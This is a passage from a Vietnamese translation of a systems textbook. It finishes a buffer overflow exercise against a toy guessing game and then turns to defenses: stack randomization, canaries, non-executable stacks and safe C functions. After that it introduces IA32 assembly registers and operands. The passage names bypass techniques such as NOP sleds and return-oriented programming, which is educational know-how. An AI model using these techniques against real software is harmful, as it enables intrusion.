<p>Chương trình in ra <code>&quot;You are so wrong!&quot;</code> vì chuỗi trong <code>exploit</code> <em>không</em> phải là số bí mật. Tuy nhiên, chương trình cũng in ra <code>&quot;You win!&quot;</code>. Hãy nhớ rằng mục tiêu của chúng ta là đánh lừa chương trình trả về 0. Trong một hệ thống lớn hơn, nơi trạng thái “thành công” được theo dõi bởi một chương trình bên ngoài, điều quan trọng nhất thường là giá trị trả về của chương trình, chứ không phải những gì nó in ra.</p>
<p>Kiểm tra giá trị trả về:</p>
<pre><code>$ echo $?
0
</code></pre>
<p>Exploit của chúng ta đã thành công! Chúng ta đã thắng trò chơi.</p>
<h3 id="7106-bảo-vệ-chống-lại-buffer-overflow"><a class="header" href="#7106-bảo-vệ-chống-lại-buffer-overflow">7.10.6. Bảo vệ chống lại Buffer Overflow</a></h3>
<p>Ví dụ trên đã thay đổi <strong>control flow</strong> (luồng điều khiển) của tệp thực thi <code>secret</code>, buộc nó trả về giá trị 0 (thành công). Tuy nhiên, một exploit như vậy có thể gây ra thiệt hại thực sự. Hơn nữa, một số hệ thống máy tính cũ <em>thực thi</em> các byte từ bộ nhớ stack. Nếu kẻ tấn công đặt các byte tương ứng với lệnh assembly lên call stack, CPU sẽ diễn giải các byte này như các lệnh <em>thực sự</em>, cho phép kẻ tấn công buộc CPU thực thi <em>bất kỳ code tùy ý nào họ muốn</em>. May mắn thay, các hệ thống máy tính hiện đại có nhiều chiến lược để làm cho việc chạy buffer overflow exploit trở nên khó khăn hơn:</p>
<ul>
<li>
<p><strong>Stack randomization</strong>: Hệ điều hành cấp phát địa chỉ bắt đầu của stack tại một vị trí ngẫu nhiên trong bộ nhớ stack, khiến vị trí/kích thước của call stack thay đổi giữa các lần chạy. Nhiều máy chạy cùng một chương trình sẽ có địa chỉ stack khác nhau. Các hệ thống Linux hiện đại sử dụng stack randomization như một tiêu chuẩn. Tuy nhiên, một kẻ tấn công kiên trì có thể brute force bằng cách thử nhiều địa chỉ khác nhau. Một mẹo phổ biến là dùng <strong>NOP sled</strong> (một dãy dài lệnh <code>nop</code>) trước code exploit thực sự. Lệnh <code>nop</code> (<code>0x90</code>) không làm gì ngoài việc tăng program counter sang lệnh tiếp theo. Miễn là CPU bắt đầu thực thi ở đâu đó trong NOP sled, nó sẽ trượt đến đoạn code exploit theo sau. Bài viết <em>Smashing the Stack for Fun and Profit</em> của Aleph One⁶ mô tả chi tiết cơ chế tấn công này.</p>
</li>
<li>
<p><strong>Stack corruption detection</strong>: Một biện pháp khác là phát hiện khi stack bị hỏng. Các phiên bản GCC gần đây sử dụng <strong>stack protector</strong> gọi là <strong>canary</strong> đóng vai trò như một “chim báo” giữa buffer và các phần tử khác của stack. Canary là một giá trị được lưu ở vùng bộ nhớ không thể ghi, có thể so sánh với giá trị đặt trên stack. Nếu canary “chết” trong quá trình chạy, chương trình biết rằng nó đang bị tấn công và sẽ dừng với thông báo lỗi. Tuy nhiên, một kẻ tấn công tinh vi có thể thay thế canary để tránh bị phát hiện.</p>
</li>
<li>
<p><strong>Limiting executable regions</strong>: Biện pháp này giới hạn code thực thi chỉ ở một số vùng bộ nhớ nhất định. Nói cách khác, call stack không còn được phép thực thi. Tuy nhiên, ngay cả biện pháp này cũng có thể bị vượt qua. Trong một cuộc tấn công sử dụng <strong>return-oriented programming</strong> (ROP), kẻ tấn công có thể “cherry-pick” các lệnh trong vùng có thể thực thi và nhảy từ lệnh này sang lệnh khác để tạo thành exploit. Có nhiều ví dụ nổi tiếng về kỹ thuật này trên mạng, đặc biệt trong các trò chơi điện tử⁷.</p>
</li>
</ul>
<p>Tuy nhiên, tuyến phòng thủ tốt nhất luôn là lập trình viên. Để ngăn chặn buffer overflow trong chương trình của bạn, hãy sử dụng các hàm C có <strong>length specifier</strong> (chỉ định độ dài) bất cứ khi nào có thể và thêm code kiểm tra giới hạn mảng. Điều quan trọng là mọi mảng được khai báo phải khớp với length specifier đã chọn. <strong>Bảng 1</strong> liệt kê một số hàm C “xấu” dễ bị buffer overflow và hàm “tốt” tương ứng nên dùng (giả sử <code>buf</code> được cấp phát 12 byte).</p>
<div class="table-wrapper"><table><thead><tr><th>Thay vì:</th><th>Hãy dùng:</th></tr></thead><tbody>
<tr><td><code>gets(buf)</code></td><td><code>fgets(buf, 12, stdin)</code></td></tr>
<tr><td><code>scanf(&quot;%s&quot;, buf)</code></td><td><code>scanf(&quot;%12s&quot;, buf)</code></td></tr>
<tr><td><code>strcpy(buf2, buf)</code></td><td><code>strncpy(buf2, buf, 12)</code></td></tr>
<tr><td><code>strcat(buf2, buf)</code></td><td><code>strncat(buf2, buf, 12)</code></td></tr>
<tr><td><code>sprintf(buf, &quot;%d&quot;, num)</code></td><td><code>snprintf(buf, 12, &quot;%d&quot;, num)</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các hàm C với <strong>length specifier</strong> (chỉ định độ dài)</p>
<p>Tệp thực thi <code>secret2</code><br />
(<a href="C7-x86_64/_attachments/secret2x86-64.tar.gz">secret2x86-64.tar.gz</a>) không còn lỗ hổng <strong>buffer overflow</strong> nữa. Hàm <code>main</code> của tệp thực thi mới này (<a href="C7-x86_64/_attachments/main2.c">main2.c</a>) được hiển thị bên dưới:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;other.h&quot; //contain secret function definitions

/*prints out the You Win! message*/
void endGame(void) {
    printf(&quot;You win!\n&quot;);
    exit(0);
}

/*main function of the game*/
int main(void) {
    int guess, secret, len, x=3;
    char buf[12]; //buffer (12 bytes long)

    printf(&quot;Enter secret number:\n&quot;);
    scanf(&quot;%12s&quot;, buf); //read guess from user input (fixed!)
    guess = atoi(buf); //convert to an integer

    secret=getSecretCode(); //call the getSecretCode function

    //check to see if guess is correct
    if (guess == secret) {
        printf(&quot;You got it right!\n&quot;);
    }
    else {
        printf(&quot;You are so wrong!\n&quot;);
        return 1; //if incorrect, exit
    }

    printf(&quot;Enter the secret string to win:\n&quot;);
    scanf(&quot;%12s&quot;, buf); //get secret string from user input (fixed!)

    guess = calculateValue(buf, strlen(buf)); //call calculateValue function

    //check to see if guess is correct
    if (guess != secret) {
        printf(&quot;You lose!\n&quot;);
        return 2; //if guess is wrong, exit
    }

    /*if both the secret string and number are correct
    call endGame()*/
    endGame();

    return 0;
}
</code></pre>
<p>Hãy chú ý rằng chúng ta đã thêm <strong>length specifier</strong> vào tất cả các lời gọi <code>scanf</code>, khiến hàm <code>scanf</code> dừng đọc dữ liệu từ đầu vào sau khi đọc đủ 12 byte đầu tiên. Chuỗi exploit giờ đây không còn làm chương trình bị lỗi nữa:</p>
<pre><code>$ ./secret2 &lt; exploit
Enter secret number:
You are so wrong!
$ echo $?
1
</code></pre>
<p>Tất nhiên, bất kỳ độc giả nào có kỹ năng <strong>reverse engineering</strong> cơ bản vẫn có thể thắng trò chơi đoán số này bằng cách phân tích code assembly. Nếu bạn chưa thử đánh bại chương trình bằng reverse engineering, chúng tôi khuyến khích bạn thử ngay bây giờ.</p>
<h3 id="references-1"><a class="header" href="#references-1">References</a></h3>
<ol>
<li>Mohit Kumar. <a href="https://thehackernews.com/2017/06/skype-crash-bug.html">Critical Skype Bug Lets Hackers Remotely ExecuteMaliciousCode</a>. 2017.</li>
<li>Tamir Zahavi-Brunner. <a href="https://blog.zimperium.com/cve-2017-13253-buffer-overflow-multiple-android-drm-services/">CVE-2017-13253: Buffer overflow in multipleAndroid DRMservices</a>.2018.</li>
<li>Tom Spring. <a href="https://threatpost.com/google-patches-high-severity-browser-bug/128661/">Google Patches 'High Severity' BrowserBug</a>.2017.</li>
<li>Christopher Kelty. <a href="https://limn.it/articles/the-morris-worm/">The MorrisWorm</a> Limn Magazine,Issue 1: Systemic Risk. 2011.</li>
<li>David Auerbach. <a href="https://nplusonemag.com/issue-19/essays/chat-wars/">Chat Wars: Microsoft vs.AOL</a> NplusOneMagazine, Issue 19. Spring 2014.</li>
<li>Aleph One. <a href="http://insecure.org/stf/smashstack.html">Smashing the Stack for Fun andProfit</a>. 1996.</li>
<li>DotsAreCool. <a href="https://youtu.be/vAHXK2wut_I">Super Mario World CreditWarp</a> (Nintendo ROP example). 2015.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="8-assembly-x86-32-bit-ia32"><a class="header" href="#8-assembly-x86-32-bit-ia32">8. Assembly x86 32-bit (IA32)</a></h2>
<p>Trong chương này, chúng ta sẽ tìm hiểu về <strong>Intel Architecture 32-bit (IA32)</strong> — kiến trúc tập lệnh (instruction set architecture) của Intel cho bộ xử lý 32-bit.<br />
Hãy nhớ rằng một <a href="C8-IA32/../C5-Arch/index.html#_what_von_neumann_knew_computer_architecture">instruction set architecture</a> (ISA) định nghĩa tập hợp các lệnh và cách code hóa nhị phân của một chương trình ở cấp độ máy.</p>
<p>Để chạy các ví dụ trong chương này, bạn sẽ cần truy cập vào một máy có bộ xử lý x86 hoặc một trình biên dịch có khả năng tạo ra các tệp thực thi 32-bit.<br />
Thuật ngữ <strong>&quot;x86&quot;</strong> thường được dùng đồng nghĩa với kiến trúc IA32.<br />
Kiến trúc x86 và biến thể 64-bit của nó (<strong>x86-64</strong>) hiện diện rộng rãi trong các máy tính hiện đại.</p>
<p>Rất ít máy tính hiện đại còn sử dụng bộ xử lý 32-bit; hầu hết các hệ thống Intel và AMD sản xuất từ năm 2007 trở đi đều dùng bộ xử lý 64-bit.<br />
Để kiểm tra loại bộ xử lý bạn đang dùng, hãy sử dụng lệnh:</p>
<pre><code class="language-bash">$ uname -m
i686
</code></pre>
<p>Nếu gõ <code>uname -m</code> và kết quả trả về là <code>i686</code> hoặc <code>i386</code>, hệ thống của bạn đang dùng bộ xử lý 32-bit.<br />
Tuy nhiên, nếu kết quả trả về là <code>x86_64</code>, hệ thống của bạn đang dùng bộ xử lý 64-bit mới hơn.</p>
<p>Lưu ý rằng vì <strong>x86-64</strong> là một <em>mở rộng</em> của ISA IA32 cũ, nên hầu như tất cả các hệ thống 64-bit đều chứa một <strong>hệ thống con 32-bit</strong> cho phép chạy các tệp thực thi 32-bit.</p>
<p>Nếu bạn đang dùng hệ thống Linux 64-bit, đôi khi cần cài đặt thêm các gói bổ sung để có thể <em>tạo</em> tệp thực thi 32-bit, như chúng ta sẽ làm trong chương này.<br />
Ví dụ, trên máy Ubuntu, bạn cần cài đặt thư viện phát triển 32-bit và các gói bổ sung để mở rộng GCC với tính năng cross-compiling:</p>
<pre><code class="language-bash">sudo apt-get install libc6-dev-i386 gcc-multilib
</code></pre>
<h3 id="nhánh-cú-pháp-của-x86"><a class="header" href="#nhánh-cú-pháp-của-x86">Nhánh cú pháp của x86</a></h3>
<p>Kiến trúc x86 thường tuân theo một trong hai nhánh cú pháp khác nhau:</p>
<ul>
<li><strong>AT&amp;T syntax</strong>: thường được dùng trên các máy UNIX, vì UNIX được phát triển tại AT&amp;T Bell Labs. Trình assembler tương ứng là <strong>GNU Assembler (GAS)</strong>. Vì chúng ta sử dụng GCC cho hầu hết các ví dụ trong sách này, chương này sẽ dùng cú pháp AT&amp;T.</li>
<li><strong>Intel syntax</strong>: thường được dùng trên các máy Windows, với trình assembler <strong>Microsoft Macro Assembler (MASM)</strong>. <strong>Netwide Assembler (NASM)</strong> là một ví dụ về assembler trên Linux sử dụng cú pháp Intel.</li>
</ul>
<p>Cuộc tranh luận về việc cú pháp nào “tốt hơn” là một trong những “cuộc chiến kinh điển” của lĩnh vực này.<br />
Tuy nhiên, việc quen thuộc với cả hai cú pháp là hữu ích, vì lập trình viên có thể gặp bất kỳ cú pháp nào trong các tình huống khác nhau.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="81-bắt-đầu-với-assembly-những-điều-cơ-bản"><a class="header" href="#81-bắt-đầu-với-assembly-những-điều-cơ-bản">8.1. Bắt đầu với Assembly: Những điều cơ bản</a></h2>
<p>Để có cái nhìn đầu tiên về assembly, chúng ta sẽ chỉnh sửa hàm <code>adder</code> từ đầu chương để đơn giản hóa hành vi của nó. Đây là phiên bản đã chỉnh sửa (<code>adder2</code>):</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

//adds two to an integer and returns the result
int adder2(int a) {
    return a + 2;
}

int main(void) {
    int x = 40;
    x = adder2(x);
    printf(&quot;x is: %d\n&quot;, x);
    return 0;
}
</code></pre>
<p>Để biên dịch đoạn code này, sử dụng lệnh sau:</p>
<pre><code>$ gcc -m32 -o modified modified.c
</code></pre>
<p>Cờ <code>-m32</code> yêu cầu GCC biên dịch code thành một file thực thi 32-bit. Nếu quên thêm cờ này, kết quả assembly có thể sẽ khác rất nhiều so với các ví dụ trong chương này; mặc định, GCC biên dịch sang assembly x86-64, biến thể 64-bit của x86. Tuy nhiên, hầu như tất cả các kiến trúc 64-bit đều có chế độ chạy 32-bit để tương thích ngược. Chương này đề cập đến IA32; các chương khác sẽ nói về x86-64 và ARM. Dù đã cũ, IA32 vẫn cực kỳ hữu ích để hiểu cách chương trình hoạt động và cách tối ưu hóa code.</p>
<p>Tiếp theo, hãy xem code assembly tương ứng của đoạn code này bằng cách gõ:</p>
<pre><code>$ objdump -d modified &gt; output
$ less output
</code></pre>
<p>Tìm đoạn code liên quan đến <code>adder2</code> bằng cách gõ <code>/adder2</code> khi đang xem file <code>output</code> với <code>less</code>. Phần liên quan đến <code>adder2</code> sẽ trông tương tự như sau:</p>
<p><strong>Kết quả assembly cho hàm <code>adder2</code></strong>:</p>
<pre><code>0804840b &lt;adder2&gt;:
 804840b:       55                      push   %ebp
 804840c:       89 e5                   mov    %esp,%ebp
 804840e:       8b 45 08                mov    0x8(%ebp),%eax
 8048411:       83 c0 02                add    $0x2,%eax
 8048414:       5d                      pop    %ebp
 8048415:       c3                      ret
</code></pre>
<p>Đừng lo nếu bạn chưa hiểu chuyện gì đang diễn ra. Chúng ta sẽ tìm hiểu chi tiết hơn về assembly ở các phần sau. Hiện tại, chúng ta sẽ nghiên cứu cấu trúc của từng lệnh riêng lẻ.</p>
<p>Mỗi dòng trong ví dụ trên chứa:</p>
<ul>
<li>Địa chỉ của lệnh trong bộ nhớ chương trình</li>
<li>Các byte tương ứng với lệnh</li>
<li>Dạng văn bản (plaintext) của lệnh</li>
</ul>
<p>Ví dụ: <code>55</code> là code máy (machine code) của lệnh <code>push %ebp</code>, và lệnh này nằm tại địa chỉ <code>0x804840b</code> trong bộ nhớ chương trình.</p>
<p>Điều quan trọng cần lưu ý là một dòng code C thường được dịch thành <strong>nhiều</strong> lệnh assembly.<br />
Ví dụ, phép toán <code>a + 2</code> được biểu diễn bằng hai lệnh:<br />
<code>mov 0x8(%ebp), %eax</code> và <code>add $0x2, %eax</code>.</p>
<blockquote>
<blockquote>
<p><strong>Assembly của bạn có thể trông khác!</strong></p>
<p>Nếu bạn biên dịch code cùng với chúng tôi, bạn có thể nhận thấy một số đoạn assembly của mình trông khác so với trong sách. Các lệnh assembly chính xác mà compiler xuất ra phụ thuộc vào phiên bản compiler và hệ điều hành. Hầu hết các ví dụ assembly trong sách này được tạo trên hệ thống chạy Ubuntu hoặc Red Hat Enterprise Linux (RHEL).</p>
<p>Trong các ví dụ tiếp theo, chúng tôi <strong>không</strong> sử dụng bất kỳ optimization flag hóa nào. Ví dụ, chúng tôi biên dịch bất kỳ file ví dụ nào (<code>example.c</code>) bằng lệnh: <code>gcc -m32 -o example example.c</code>. Do đó, sẽ có nhiều lệnh trông như dư thừa trong các ví dụ. Hãy nhớ rằng compiler không “thông minh” — nó chỉ đơn giản làm theo một loạt quy tắc để dịch code dễ đọc của con người sang ngôn ngữ máy. Trong quá trình dịch này, việc xuất hiện một số lệnh dư thừa là điều bình thường. Các compiler tối ưu hóa sẽ loại bỏ nhiều lệnh dư thừa này trong quá trình tối ưu hóa, nội dung này sẽ được đề cập ở <a href="C8-IA32/../C12-CodeOpt/index.html#_code_optimization">chương sau</a>.</p>
</blockquote>
</blockquote>
<h3 id="811-thanh-ghi-registers"><a class="header" href="#811-thanh-ghi-registers">8.1.1. Thanh ghi (Registers)</a></h3>
<p>Hãy nhớ rằng <strong>register</strong> (thanh ghi) là một đơn vị lưu trữ có kích thước bằng một từ (word-sized) nằm trực tiếp trên CPU. Có thể có các thanh ghi riêng cho dữ liệu, lệnh và địa chỉ. Ví dụ, CPU Intel có tổng cộng tám thanh ghi để lưu trữ dữ liệu 32-bit:</p>
<p><code>%eax</code>, <code>%ebx</code>, <code>%ecx</code>, <code>%edx</code>, <code>%edi</code>, <code>%esi</code>, <code>%esp</code>, và <code>%ebp</code>.</p>
<p>Chương trình có thể đọc hoặc ghi vào cả tám thanh ghi này. Sáu thanh ghi đầu tiên đều lưu dữ liệu <strong>general-purpose</strong> (đa dụng), trong khi hai thanh ghi cuối thường được compiler dành riêng để lưu dữ liệu địa chỉ. Mặc dù một chương trình có thể diễn giải nội dung của thanh ghi đa dụng là số nguyên hoặc địa chỉ, bản thân thanh ghi không phân biệt điều đó. Hai thanh ghi cuối (<code>%esp</code> và <code>%ebp</code>) lần lượt được gọi là <strong>stack pointer</strong> (con trỏ stack) và <strong>frame pointer</strong> (con trỏ khung stack). Compiler dành riêng các thanh ghi này cho các thao tác duy trì cấu trúc của <strong>program stack</strong>. Thông thường, <code>%esp</code> trỏ tới đỉnh của stack chương trình, trong khi <code>%ebp</code> trỏ tới đáy của stack frame hiện tại. Chúng ta sẽ bàn chi tiết hơn về stack frame và hai thanh ghi này trong phần nói về <a href="C8-IA32/functions.html#_functions_in_assembly">functions</a>.</p>
<p>Thanh ghi cuối cùng đáng nhắc đến là <code>%eip</code> hay <strong>instruction pointer</strong> (đôi khi gọi là <strong>program counter</strong> – PC). Nó trỏ tới lệnh tiếp theo sẽ được CPU thực thi. Không giống tám thanh ghi kể trên, chương trình không thể ghi trực tiếp vào <code>%eip</code>.</p>
<h3 id="812-cú-pháp-nâng-cao-của-thanh-ghi-advanced-register-notation"><a class="header" href="#812-cú-pháp-nâng-cao-của-thanh-ghi-advanced-register-notation">8.1.2. Cú pháp nâng cao của thanh ghi (Advanced Register Notation)</a></h3>
<p>Với sáu thanh ghi đầu tiên vừa nêu, ISA cung cấp cơ chế truy cập 16 bit thấp của mỗi thanh ghi. ISA cũng cung cấp cơ chế riêng để truy cập các thành phần 8 bit của 16 bit thấp này đối với bốn thanh ghi đầu tiên. <strong>Bảng 1</strong> liệt kê từng thanh ghi và cơ chế (nếu có) để truy cập các byte thành phần.</p>
<div class="table-wrapper"><table><thead><tr><th>32-bit register (bits 31–0)</th><th>Lower 16 bits (bits 15–0)</th><th>Bits 15–8</th><th>Bits 7–0</th></tr></thead><tbody>
<tr><td><code>%eax</code></td><td><code>%ax</code></td><td><code>%ah</code></td><td><code>%al</code></td></tr>
<tr><td><code>%ebx</code></td><td><code>%bx</code></td><td><code>%bh</code></td><td><code>%bl</code></td></tr>
<tr><td><code>%ecx</code></td><td><code>%cx</code></td><td><code>%ch</code></td><td><code>%cl</code></td></tr>
<tr><td><code>%edx</code></td><td><code>%dx</code></td><td><code>%dh</code></td><td><code>%dl</code></td></tr>
<tr><td><code>%edi</code></td><td><code>%di</code></td><td></td><td></td></tr>
<tr><td><code>%esi</code></td><td><code>%si</code></td><td></td><td></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các thanh ghi x86 và cơ chế truy cập byte thấp.</p>
<ul>
<li>
<p>16 bit thấp của bất kỳ thanh ghi nào kể trên có thể được truy cập bằng cách dùng hai ký tự cuối trong tên thanh ghi. Ví dụ: <code>%ax</code> truy cập 16 bit thấp của <code>%eax</code>.</p>
</li>
<li>
<p>Byte <em>cao</em> và <em>thấp</em> trong 16 bit thấp của bốn thanh ghi đầu tiên có thể được truy cập bằng cách lấy hai ký tự cuối của tên thanh ghi và thay ký tự cuối bằng <code>h</code> (high – cao) hoặc <code>l</code> (low – thấp) tùy byte cần truy cập. Ví dụ: <code>%al</code> tham chiếu 8 bit thấp của <code>%ax</code>, còn <code>%ah</code> tham chiếu 8 bit cao của <code>%ax</code>. Các thanh ghi 8 bit này thường được compiler dùng để lưu giá trị 1 byte cho một số thao tác nhất định, như dịch bit (bitwise shift) – vì một thanh ghi 32-bit không thể dịch quá 31 vị trí và số 32 chỉ cần 1 byte để lưu. Nói chung, compiler sẽ dùng thành phần thanh ghi nhỏ nhất cần thiết để hoàn thành một phép toán.</p>
</li>
</ul>
<h3 id="813-cấu-trúc-lệnh-instruction-structure"><a class="header" href="#813-cấu-trúc-lệnh-instruction-structure">8.1.3. Cấu trúc lệnh (Instruction Structure)</a></h3>
<p>Mỗi lệnh gồm một <strong>opcode</strong> (code thao tác) chỉ định nó làm gì, và một hoặc nhiều <strong>operand</strong> (toán hạng) cho biết cách thực hiện. Ví dụ: lệnh <code>add $0x2, %eax</code> có opcode là <code>add</code> và các toán hạng là <code>$0x2</code> và <code>%eax</code>.</p>
<p>Mỗi toán hạng tương ứng với một vị trí nguồn hoặc đích cho thao tác cụ thể. Có nhiều loại toán hạng:</p>
<ul>
<li><strong>Constant (literal)</strong>: giá trị hằng, đứng trước bởi ký hiệu <code>$</code>. Ví dụ: trong <code>add $0x2, %eax</code>, <code>$0x2</code> là giá trị hằng ở hệ thập lục phân 0x2.</li>
<li><strong>Register</strong>: tham chiếu trực tiếp tới một thanh ghi. Ví dụ: <code>add $0x2, %eax</code> chỉ định <code>%eax</code> là nơi lưu kết quả của phép cộng.</li>
<li><strong>Memory</strong>: tham chiếu tới một giá trị trong bộ nhớ chính (RAM), thường dùng để tra cứu địa chỉ. Dạng địa chỉ bộ nhớ có thể kết hợp thanh ghi và giá trị hằng. Ví dụ: trong <code>mov 0x8(%ebp), %eax</code>, toán hạng <code>0x8(%ebp)</code> nghĩa là “cộng 0x8 vào giá trị trong <code>%ebp</code>, rồi truy xuất bộ nhớ tại địa chỉ đó”. Đây chính là thao tác dereference con trỏ.</li>
</ul>
<h3 id="814-ví-dụ-với-toán-hạng-an-example-with-operands"><a class="header" href="#814-ví-dụ-với-toán-hạng-an-example-with-operands">8.1.4. Ví dụ với toán hạng (An Example with Operands)</a></h3>
<p>Cách tốt nhất để giải thích chi tiết về toán hạng là đưa ra một ví dụ nhanh. Giả sử bộ nhớ chứa các giá trị sau:</p>
<div class="table-wrapper"><table><thead><tr><th>Address</th><th>Value</th></tr></thead><tbody>
<tr><td>0x804</td><td>0xCA</td></tr>
<tr><td>0x808</td><td>0xFD</td></tr>
<tr><td>0x80c</td><td>0x12</td></tr>
<tr><td>0x810</td><td>0x1E</td></tr>
</tbody></table>
</div>
<p>Giả sử các thanh ghi chứa giá trị:</p>
<div class="table-wrapper"><table><thead><tr><th>Register</th><th>Value</th></tr></thead><tbody>
<tr><td>%eax</td><td>0x804</td></tr>
<tr><td>%ebx</td><td>0x10</td></tr>
<tr><td>%ecx</td><td>0x4</td></tr>
<tr><td>%edx</td><td>0x1</td></tr>
</tbody></table>
</div>
<p>Khi đó, các toán hạng trong <strong>Bảng 2</strong> sẽ được đánh giá (evaluate) thành các giá trị như hiển thị. Mỗi dòng trong bảng ghép một toán hạng với dạng của nó (ví dụ: constant, register, memory), cách nó được dịch, và giá trị của nó. Lưu ý: ký hiệu <code>M[x]</code> ở đây biểu thị giá trị tại vị trí bộ nhớ có địa chỉ x.</p>
<div class="table-wrapper"><table><thead><tr><th>Operand</th><th>Form</th><th>Translation</th><th>Value</th></tr></thead><tbody>
<tr><td><code>%ecx</code></td><td>Register</td><td><code>%ecx</code></td><td>0x4</td></tr>
<tr><td><code>(%eax)</code></td><td>Memory</td><td>M[<code>%eax</code>] hoặc M[0x804]</td><td>0xCA</td></tr>
<tr><td><code>$0x808</code></td><td>Constant</td><td>0x808</td><td>0x808</td></tr>
<tr><td><code>0x808</code></td><td>Memory</td><td>M[0x808]</td><td>0xFD</td></tr>
<tr><td><code>0x8(%eax)</code></td><td>Memory</td><td>M[<code>%eax</code> + 8] hoặc M[0x80c]</td><td>0x12</td></tr>
<tr><td><code>(%eax, %ecx)</code></td><td>Memory</td><td>M[<code>%eax</code> + <code>%ecx</code>] hoặc M[0x808]</td><td>0xFD</td></tr>
<tr><td><code>0x4(%eax, %ecx)</code></td><td>Memory</td><td>M[<code>%eax</code> + <code>%ecx</code> + 4] hoặc M[0x80c]</td><td>0x12</td></tr>
<tr><td><code>0x800(,%edx,4)</code></td><td>Memory</td><td>M[0x800 + <code>%edx</code>*4] hoặc M[0x804]</td><td>0xCA</td></tr>
<tr><td><code>(%eax, %edx, 8)</code></td><td>Memory</td><td>M[<code>%eax</code> + <code>%edx</code>*8] hoặc M[0x80c]</td><td>0x12</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Ví dụ về các toán hạng (operands)</p>
<p>Trong <strong>Bảng 2</strong>, ký hiệu <code>%ecx</code> biểu thị giá trị được lưu trong thanh ghi <code>%ecx</code>.<br />
Ngược lại, M[<code>%eax</code>] cho biết giá trị bên trong <code>%eax</code> sẽ được coi là một địa chỉ, và cần <strong>dereference</strong> (truy xuất) giá trị tại địa chỉ đó.<br />
Do đó, toán hạng <code>(%eax)</code> tương ứng với M[0x804], và giá trị tại địa chỉ này là 0xCA.</p>
<p>Một vài lưu ý quan trọng trước khi tiếp tục:<br />
Mặc dù <strong>Bảng 2</strong> cho thấy nhiều dạng toán hạng hợp lệ, nhưng không phải tất cả đều có thể dùng thay thế cho nhau trong mọi trường hợp.</p>
<p>Cụ thể:</p>
<ul>
<li>Toán hạng dạng <strong>constant</strong> không thể đóng vai trò là toán hạng đích (destination operand).</li>
<li>Toán hạng dạng <strong>memory</strong> không thể đồng thời là cả nguồn (source) và đích (destination) trong cùng một lệnh.</li>
<li>Trong các phép toán có <strong>scaling</strong> (xem hai toán hạng cuối trong <a href="C8-IA32/basics.html#Operands32">Bảng 2</a>), hệ số nhân (scaling factor) phải là một trong các giá trị 1, 2, 4 hoặc 8.</li>
</ul>
<p><strong>Bảng 2</strong> được cung cấp để tham khảo; tuy nhiên, việc nắm vững các dạng toán hạng chính sẽ giúp bạn đọc nhanh hơn khi phân tích code assembly.</p>
<h3 id="815-hậu-tố-của-lệnh-instruction-suffixes"><a class="header" href="#815-hậu-tố-của-lệnh-instruction-suffixes">8.1.5. Hậu tố của lệnh (Instruction Suffixes)</a></h3>
<p>Trong một số trường hợp ở các ví dụ tiếp theo, các lệnh thông dụng và lệnh số học có thêm <strong>hậu tố</strong> (suffix) để chỉ <strong>kích thước</strong> (gắn với <strong>kiểu dữ liệu</strong>) của dữ liệu được thao tác ở cấp độ code lệnh.<br />
Compiler sẽ tự động dịch code sang các lệnh có hậu tố phù hợp.<br />
<strong>Bảng 3</strong> cho thấy các hậu tố phổ biến của lệnh x86.</p>
<div class="table-wrapper"><table><thead><tr><th>Suffix</th><th>C Type</th><th>Size (bytes)</th></tr></thead><tbody>
<tr><td>b</td><td><code>char</code></td><td>1</td></tr>
<tr><td>w</td><td><code>short</code></td><td>2</td></tr>
<tr><td>l</td><td><code>int</code>, <code>long</code>, <code>unsigned</code></td><td>4</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Ví dụ về hậu tố của lệnh.</p>
<p>Lưu ý: các lệnh liên quan đến <strong>thực thi có điều kiện</strong> sẽ có hậu tố khác nhau tùy thuộc vào điều kiện được đánh giá.<br />
Chúng ta sẽ tìm hiểu các lệnh liên quan đến điều kiện trong <a href="C8-IA32/conditional_control_loops.html#_conditional_control_and_loops">phần sau</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="82-các-lệnh-thông-dụng-common-instructions"><a class="header" href="#82-các-lệnh-thông-dụng-common-instructions">8.2. Các lệnh thông dụng (Common Instructions)</a></h2>
<p>Trong phần này, chúng ta sẽ tìm hiểu một số lệnh x86 assembly thường gặp. <strong>Bảng 1</strong> liệt kê các lệnh nền tảng nhất trong x86 assembly.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>mov S, D</code></td><td>S → D (sao chép giá trị của S vào D)</td></tr>
<tr><td><code>add S, D</code></td><td>S + D → D (cộng S vào D và lưu kết quả vào D)</td></tr>
<tr><td><code>sub S, D</code></td><td>D - S → D (trừ S <em>khỏi</em> D và lưu kết quả vào D)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các lệnh thông dụng nhất.</p>
<p>Ví dụ, chuỗi lệnh:</p>
<pre><code>mov    0x8(%ebp),%eax
add    $0x2,%eax
</code></pre>
<p>được dịch như sau:</p>
<ul>
<li>Sao chép giá trị tại vị trí <code>%ebp</code> + 0x8 trong <strong>bộ nhớ</strong> (M[<code>%ebp</code> + 0x8]) vào thanh ghi <code>%eax</code>.</li>
<li>Cộng giá trị <code>0x2</code> vào thanh ghi <code>%eax</code> và lưu kết quả vào <code>%eax</code>.</li>
</ul>
<p>Ba lệnh trong <strong>Bảng 1</strong> cũng là nền tảng để xây dựng các lệnh quản lý tổ chức của <strong>program stack</strong> (ngăn xếp chương trình, hay <strong>call stack</strong>).<br />
Hãy nhớ rằng thanh ghi <code>%ebp</code> và <code>%esp</code> lần lượt là <strong>frame pointer</strong> và <strong>stack pointer</strong>, được compiler dành riêng để quản lý call stack.<br />
Như đã đề cập trong phần <a href="C8-IA32/../C2-C_depth/scope_memory.html#_parts_of_program_memory_and_scope">program memory</a>, call stack lưu trữ các biến cục bộ và tham số, đồng thời giúp chương trình theo dõi quá trình thực thi của chính nó (xem <strong>Hình 1</strong>).</p>
<p><img src="C8-IA32/_images/memparts.png" alt="The parts of a program's address space." /><br />
<strong>Hình 1.</strong> Các phần trong không gian địa chỉ của một chương trình.</p>
